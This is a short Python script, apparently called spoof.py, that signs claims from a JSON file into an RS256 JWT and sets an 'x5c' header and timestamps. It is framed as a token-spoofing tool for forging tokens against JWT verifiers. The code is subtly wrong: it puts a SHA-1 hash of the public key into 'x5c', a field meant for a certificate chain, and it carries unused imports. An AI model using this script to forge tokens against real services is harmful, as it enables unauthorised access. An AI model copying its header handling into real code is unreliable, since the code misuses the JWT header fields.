import jwt
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.x509 import load_pem_x509_certificate
import base64
import sys
import json
import hashlib
import time

def generate_kid(cert):
    public_key = cert.public_key().public_bytes(
        serialization.Encoding.PEM,
        serialization.PublicFormat.SubjectPublicKeyInfo
    )
    return base64.urlsafe_b64encode(hashlib.sha1(public_key).digest()).decode("utf-8").rstrip("=")

def spoof_jwt(claims, private_key, public_key, include_timestamp=True):

    kid = generate_kid(public_key)

    header = {
        "alg": "RS256",
        "x5c": kid
    }

    if include_timestamp:
        claims["iat"] = int(time.time())
        claims["exp"] = claims["iat"] + 600
        claims["nbf"] = claims["iat"] - 60

    token = jwt.encode(claims, private_key, algorithm="RS256", headers=header)
    return token

if __name__ == "__main__":

    if len(sys.argv) < 4:
        print("Usage: python3 spoof.py <private_key_path> <cert_path> <claims_path>")
        sys.exit(1)

    # Load your RSA private key
    with open(sys.argv[1], "rb") as key_file:
        private_key = serialization.load_pem_private_key(key_file.read(), password=None)

    with open(sys.argv[2], "rb") as cert_file:
        cert = load_pem_x509_certificate(cert_file.read())

    with open(sys.argv[3], "r") as claims_file:
        claims = json.load(claims_file)

    token = spoof_jwt(claims, private_key, cert)
    print(token)
